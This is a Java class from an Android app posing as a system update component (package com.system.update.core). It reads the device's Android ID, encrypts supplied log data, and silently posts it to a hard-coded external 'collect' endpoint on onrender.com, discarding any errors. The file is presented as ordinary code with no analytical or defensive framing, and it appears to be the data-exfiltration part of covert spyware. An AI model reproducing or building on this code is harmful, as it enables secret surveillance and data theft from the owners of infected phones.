package com.system.update.core;

import android.content.Context;
import android.provider.Settings;
import com.system.update.core.SecurityShield;
import okhttp3.*;
import org.json.JSONObject;
import java.util.Map;
import java.util.HashMap;

public class NetworkManager {
    private static final String SERVER_URL = "https://system-update-h32p.onrender.com/api/v1/collect";
    private final OkHttpClient client = new OkHttpClient();
    private final SecurityShield shield = new SecurityShield();
    private Context context;

    public NetworkManager() {}

    public NetworkManager(Context context) {
        this.context = context;
    }

    public String getDeviceId() {
        if (context != null) {
            return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        return "unknown_device";
    }

    public void sync(String dataString, String type) {
        Map<String, Object> data = new HashMap<>();
        data.put("type", type);
        data.put("log", dataString);
        sendData(getDeviceId(), data);
    }

    public void sendData(String deviceId, Map<String, Object> data) {
        try {
            String encryptedPayload = shield.encrypt(data, deviceId);
            
            JSONObject json = new JSONObject();
            json.put("device_id", deviceId);
            json.put("payload", encryptedPayload);

            RequestBody body = RequestBody.create(
                MediaType.parse("application/json; charset=utf-8"),
                json.toString()
            );

            Request request = new Request.Builder()
                .url(SERVER_URL)
                .post(body)
                .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, java.io.IOException e) {}

                @Override
                public void onResponse(Call call, Response response) throws java.io.IOException {
                    response.close();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
